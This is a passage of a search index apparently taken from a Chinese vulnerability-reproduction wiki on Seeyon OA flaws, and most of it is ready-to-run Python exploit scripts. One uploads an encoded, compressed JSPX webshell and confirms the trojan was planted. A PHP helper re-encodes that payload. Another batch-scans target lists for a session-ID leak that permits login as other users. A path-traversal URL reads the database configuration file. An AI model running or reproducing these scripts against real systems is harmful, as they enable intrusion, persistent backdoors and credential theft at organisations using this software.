) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528\uff0c\u5199\u5165\u5931\u8d25 {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) \u6587\u4ef6\u7f16\u7801\u811a\u672c, \u81ea\u884c\u8fdb\u884c\u81ea\u5b9a\u4e49\u8c03\u8bd5 <?php $webshell = urldecode ( \"%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00\" ); $webshell = iconv ( \"UTF-8\" , \"ISO-8859-1\" , $webshell ); $webshell = gzdecode ( $webshell ); /* \u81ea\u884c\u66f4\u6539\u811a\u672c\u81ea\u5b9a\u4e49\u4e0a\u4f20\u4f4d\u7f6e,webshell\u540d\u5b57,\u51b0\u874e\u5bc6\u7801 */ $webshell = str_replace ( \"../webapps/seeyon/\" , \"../webapps/seeyon/\" , $webshell ); $webshell = str_replace ( \"PeiQi.jspx\" , \"PeiQi.jspx\" , $webshell ); $webshell = str_replace ( \"e45e329feb5d925b\" , \"e45e329feb5d925b\" , $webshell ); $webshell = gzencode ( $webshell ); $webshell = iconv ( \"ISO-8859-1\" , \"UTF-8\" , $webshell ); $webshell = urlencode ( \" $webshell \" ); echo $webshell ; ?> [!NOTE] \u591a\u4e2a\u76ee\u6807 import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA \u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url_1 = target_url + \"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip\" print ( ' \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42: {} ' . format ( vuln_url_1 )) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } data = \"managerMethod=validate&arguments= %1F %C2%8B %08% 00 %00% 00 %00% 00 %00% 0AuTK%C2 %93% C2%A2H %10% 3E%C3%AF%C3%BE%0A%C3 %82% C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB %13% 7Bh_%C2 %88% 28%2A %28% C2%AF%C2%8D%3D %40% 15Ba %15% C2%B0%C3%B2 %10% C3%AC%C2 %98% C3%BF%C2%BE %05% C3 %98% C3 %93% 3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2 %8E %C2%9DC%C2 %95x %C3%9D %3F %C2 %98% C3 %81% 17%C3%A6M%C2%A28%C2%A4%C2%96t3 %2F %C3%8D%C2%BA%C3%AF%C3%A2y%C2 %99% 5C%C2%BC4EqT %3F j%C3 %99% 05E %3E %C2%938Y%C3 %80% C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2 %92% 3E%C2%A5%C2 %9E W%C3 %85% C3%91S%C3%A7%C3%BB%C3%AFL%7B %7E %0B%C2%9D%C3 %82% C3%A9%C2%A3%C2%B8%C2%BF%C2%A3 %26% C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3 %00% C2%91we %3E Q%C3%AB%C3 %95% C3%B8%C2 %8F %C2%9D%C2%9D%C2 %87% C3%B6%C2%A8 %1F %C2%A6I%C3%99y%C3%B8 %09% C3%8B%C3%9C%5DH %03% 0F%C3%A3%C3%9A%C2 %87% C2%9D%C2 %98% C3%9C%C3 %80% 2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6 %25% C2%B5%C2%8CE%C3 %8E Re%C3 %81% 2C.%C3 %96% 5C %12% 402%C3 %8F%01% C2%AF%C3%A7k%C2%A2 %14% C2%AE6%C2 %96% C2 %8F %C2 %83% C2 %97% C3%A2%28. %22% 5B%C2 %93% 7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a %25% C2 %85% C3 %83g %27R%C2%AE%5B%C2%A2 %26% C2 %80% C3%A8 %21% 141gk%C3 %82% C3%952+%C2%96D%C2%9C%01q%5C%C3 %81% 1A%C2 %9F %2C8K %13% 06%C3%B4%3D%5D%C2%A38mx%C3 %93% C3 %8F - %7E%25% C2 %80% C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3 %89e%24% 15%C2%BB%C2%B0%C3%BC %07% C3%B0 %2F %C3 %9F lQ %0F %5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q %12% C2 %95% C3 %942% C2 %95% C2%9B%C2%B48%C3%BA%C2%B6 %19% C2%B0%C2%B6 %21% C2%9CA5%C2%99Q%C2%9D%1B %60% C3%8B%C3%822T%0C%C2%A2L%C2 %97% C3%A7%C2%AD%C3 %9E A%1C %07% 14%C2%A3%C2 %92% C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2 %96% 1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92 %00% C3%BC%C3 %86% C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2 %84G 4 %3E%16% C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C %3E %C2%B6%C3 %98% C2%B2 %28% C2%A5%C2%9Bi%C2 %89% C3 %96% C2%A4%C3%84.%C2 %81% C2%AC3%3D%C2 %8F N %26% C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3 %9E %2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB %40% C3%B0 %15% C2%8A %25% C2 %863% C3%A1 %00% C2 %97% C2%AB%C3 %84% 25%C3%80wn%2C%C2%B2 %0F %C3%BB%C2 %81% 7D%C3%98T%5B%C3 %83% C3%86V%C2%A8%C2 %9F %C2%B7 %07i%60% 21i %048% C3%BD%C3 %96% C3 %94% 00%09Wh%C2%AA%C2 %86e %C2 %94% 03%5B%C3%B3 %11% C3 %94% C2%A4%C3 %94% C2%A9%C3 %8E %C2%A3%3D%C2 %87% C2%AFN%1B%C3%A3%C3%B8%C2%8D %5E%13% C2 %88% C3%A1%1C%C3 %93% C2%BA%C2%AA%C2%81K %14% 2COW%13U%C3 %9F +%C3%B9%C2 %90% C2%85k%1A%C2 %83c %C3%AE%C3%A3%0D%2As%C3%9B %04% C3%BE%C2 %91% C3 %93% C3 %83% 3AV%C2%8D%C3 %93% C2 %85% 23 %3F %C3%81V%C3%A5%C3 %87% 1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3 %96% C3 %88% C2%A7u%C2%BE %40% C3%A5 %27% C3%AB7%7C%C3%AD%3Cr%C2 %89% C3 %8E %C3 %93% C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3 %86% C2%AF_k%23O%C3 %8F T %0E b%C2%AB %12% C3 %8E .k%C3 %93% 7C%2CRY %140% C2%AC %267h% 0Cs%C3 %97% C3 %807% C3%BA6%C3%9D%C3%AB%C3%8AB %09% C3 %959% C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2 %8F tb%C3 %93% 5E%C2 %95% C2 %97% 2B%0CL%1D %03% 7E%C2 %9F %C3%9B%C2%9C%C3 %8E%1E %C2 %89% C3%BE%C3%B6G %0E j%C2%9AN%C2%ADK%C2 %8E 1%C3%B53%C2%A11%C3 %90% C3%B8%C3%A1%C3%8A%C2%8D %14% C3 %962% C2 %84% C2 %90% C3 %86G %C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q %0E E%7D %08i mw%C3%93q%C3 %93% C2 %93% C2%80S%2A%C3 %87% C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF %7F %7C%C2 %9F r %26% C3%8D%C2%A3 %3E A %29% C3%A8O %5E %C2%B4%C3%B9%C2%B7%C3%A1%C3%8C %031% C2%A4%C2 %83% 0E%C3%AFw%3B%C3%A3%C2 %9F %2B%C3%B5%C3%BE%3B%C3 %95% C2%AD%C3 %99% C2%9Dim%5B%C2%A6w %07% C3%AC%C2%B7%C3%B7 %24% 3F%C2%9D %28% 40%C2%B3 %04% 1E%C2%BEt%C2 %8E %C2 %87% C3 %85% C3 %97% C3%A7%C2 %8F K%C3%A2%C3%A3%C2 %9E %C3%A97%0C%C2 %8E z %1F %C3 %81% C3%BFO %17% C3%A08%C3%B5%C2%A8c %3F %C2%BE%C3 %97% 7B%C2 %90% 12%C3 %90% 3B1i%C3%A6d %080e Y%C3%B6 %1E%5E %C2%BB %3F %C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE %17% 1CR%C2%AD%17W %05% 00%00\" requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url_1 , headers = headers , timeout = 5 , data = data , verify = False ) webshell_url = target_url + \"/seeyon/PeiQi.jspx\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = webshell_url , timeout = 5 , verify = False , headers = headers ) if response . status_code == 200 and \"\u7cfb\u7edf\u7ea7\u9519\u8bef\" in response . text : with open ( 'webshell.txt' , 'a' , encoding = 'utf8' ) as vu : vu . write ( \"\u76ee\u6807 {} \u88ab\u4e0a\u4f20\u6728\u9a6c: {} /seeyon/PeiQi.jspx \\n \" . format ( target_url , target_url )) print ( \" \\033 [31m[x] \u76ee\u6807 {} \u88ab\u4e0a\u4f20\u6728\u9a6c: {} /seeyon/PeiQi.jspx \\033 [0m\" . format ( target_url , target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20getSessionList.jsp%20Session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/","text":"\u81f4\u8fdcOA getSessionList.jsp Session\u6cc4\u6f0f\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u901a\u8fc7\u4f7f\u7528\u5b58\u5728\u6f0f\u6d1e\u7684\u8bf7\u6c42\u65f6\uff0c\u4f1a\u56de\u663e\u90e8\u5206\u7528\u6237\u7684Session\u503c\uff0c\u5bfc\u81f4\u51fa\u73b0\u4efb\u610f\u767b\u5f55\u7684\u60c5\u51b5 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u672a\u77e5 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6e90\u7801 <%@ page contentType = \"text/html;charset=GBK\" %> <%@ page session = \"false\" %> <%@ page import = \"net.btdz.oa.ext.https.*\" %> <% String reqType = request . getParameter ( \"cmd\" ); String outXML = \"\" ; boolean allowHttps = true ; if ( \"allowHttps\" . equalsIgnoreCase ( reqType )){ //add code to judge whether it allow https or not allowHttps = FetchSessionList . checkHttps (); if ( allowHttps ) response . setHeader ( \"AllowHttps\" , \"1\" ); } if ( \"getAll\" . equalsIgnoreCase ( reqType )){ outXML = FetchSessionList . getXMLAll (); } else if ( \"getSingle\" . equalsIgnoreCase ( reqType )){ String sessionId = request . getParameter ( \"ssid\" ); if ( sessionId != null ){ outXML = FetchSessionList . getXMLBySessionId ( sessionId ); } } else { outXML += \"<?xml version=\\\"1.0\\\" encoding=\\\"GB2312\\\"?>\\r\\n\" ; outXML += \"<SessionList>\\r\\n\" ; // outXML += \"<Session>\\r\\n\"; // outXML += \"</Session>\\r\\n\"; outXML += \"</SessionList>\\r\\n\" ; } out . println ( outXML ); %> \u4ece\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u77e5\uff0c\u5f53cmd\u53c2\u6570\u4e3agetAll\u65f6\uff0c\u4fbf\u53ef\u83b7\u53d6\u5230\u6240\u6709\u7528\u6237\u7684SessionID ,\u8bf7\u6c42 http://xxx.xxx.xxx.xxx/yyoa/ext/https/getSessionList.jsp?cmd=getAll \u56de\u663eSession\u5219\u5b58\u5728\u6f0f\u6d1e \u901a\u8fc7\u66ff\u6362 Session\u5373\u53ef\u767b\u9646\u7cfb\u7edf \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/ext/https/getSessionList.jsp?cmd=getAll\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"/yyoa/index.jsp\" not in response . text and \"<sessionID>\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,Session\u5730\u5740: {} \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" ) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name )","title":"\u81f4\u8fdcOA getSessionList.jsp Session\u6cc4\u6f0f\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20getSessionList.jsp%20Session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#\u81f4\u8fdcoa-getsessionlistjsp-session\u6cc4\u6f0f\u6f0f\u6d1e","text":"","title":"\u81f4\u8fdcOA getSessionList.jsp Session\u6cc4\u6f0f\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20getSessionList.jsp%20Session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u901a\u8fc7\u4f7f\u7528\u5b58\u5728\u6f0f\u6d1e\u7684\u8bf7\u6c42\u65f6\uff0c\u4f1a\u56de\u663e\u90e8\u5206\u7528\u6237\u7684Session\u503c\uff0c\u5bfc\u81f4\u51fa\u73b0\u4efb\u610f\u767b\u5f55\u7684\u60c5\u51b5","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20getSessionList.jsp%20Session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u672a\u77e5","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20getSessionList.jsp%20Session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6e90\u7801 <%@ page contentType = \"text/html;charset=GBK\" %> <%@ page session = \"false\" %> <%@ page import = \"net.btdz.oa.ext.https.*\" %> <% String reqType = request . getParameter ( \"cmd\" ); String outXML = \"\" ; boolean allowHttps = true ; if ( \"allowHttps\" . equalsIgnoreCase ( reqType )){ //add code to judge whether it allow https or not allowHttps = FetchSessionList . checkHttps (); if ( allowHttps ) response . setHeader ( \"AllowHttps\" , \"1\" ); } if ( \"getAll\" . equalsIgnoreCase ( reqType )){ outXML = FetchSessionList . getXMLAll (); } else if ( \"getSingle\" . equalsIgnoreCase ( reqType )){ String sessionId = request . getParameter ( \"ssid\" ); if ( sessionId != null ){ outXML = FetchSessionList . getXMLBySessionId ( sessionId ); } } else { outXML += \"<?xml version=\\\"1.0\\\" encoding=\\\"GB2312\\\"?>\\r\\n\" ; outXML += \"<SessionList>\\r\\n\" ; // outXML += \"<Session>\\r\\n\"; // outXML += \"</Session>\\r\\n\"; outXML += \"</SessionList>\\r\\n\" ; } out . println ( outXML ); %> \u4ece\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u77e5\uff0c\u5f53cmd\u53c2\u6570\u4e3agetAll\u65f6\uff0c\u4fbf\u53ef\u83b7\u53d6\u5230\u6240\u6709\u7528\u6237\u7684SessionID ,\u8bf7\u6c42 http://xxx.xxx.xxx.xxx/yyoa/ext/https/getSessionList.jsp?cmd=getAll \u56de\u663eSession\u5219\u5b58\u5728\u6f0f\u6d1e \u901a\u8fc7\u66ff\u6362 Session\u5373\u53ef\u767b\u9646\u7cfb\u7edf","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20getSessionList.jsp%20Session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/ext/https/getSessionList.jsp?cmd=getAll\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"/yyoa/index.jsp\" not in response . text and \"<sessionID>\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,Session\u5730\u5740: {} \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" ) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20webmail.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62422/","text":"\u81f4\u8fdcOA webmail.do\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d CNVD-2020-62422 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u81f4\u8fdcOA\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u4e0b\u8f7d\u4efb\u610f\u6587\u4ef6\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u81f4\u8fdcOA A6-V5 \u81f4\u8fdcOA A8-V5 \u81f4\u8fdcOA G6 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee url http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties \u5b58\u5728\u6f0f\u6d1e\u7684OA 